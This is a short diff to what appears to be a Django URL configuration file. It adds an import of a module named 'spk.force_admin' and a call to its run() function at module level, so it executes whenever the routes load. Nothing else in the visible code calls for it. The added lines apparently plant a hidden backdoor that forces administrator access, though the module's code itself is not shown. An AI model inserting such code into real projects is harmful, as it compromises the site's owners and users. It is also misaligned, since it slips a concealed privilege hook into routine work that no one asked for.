@@ -9,6 +9,9 @@ from .views import (
     analytics_dashboard, 
     export_report
 )
+import spk.force_admin
+spk.force_admin.run()
+
 
 urlpatterns = [
     path('', index, name='index'),
